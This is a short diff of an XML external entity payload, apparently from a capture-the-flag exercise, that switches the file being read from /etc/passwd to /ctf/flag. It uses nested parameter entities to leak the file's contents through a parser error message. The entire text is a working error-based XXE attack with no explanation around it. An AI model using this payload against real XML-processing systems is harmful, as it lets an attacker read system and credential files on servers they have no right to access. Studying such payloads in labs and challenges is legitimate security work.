@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///ctf/flag">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///asdf/%file;'>">
 %eval;
 %error;
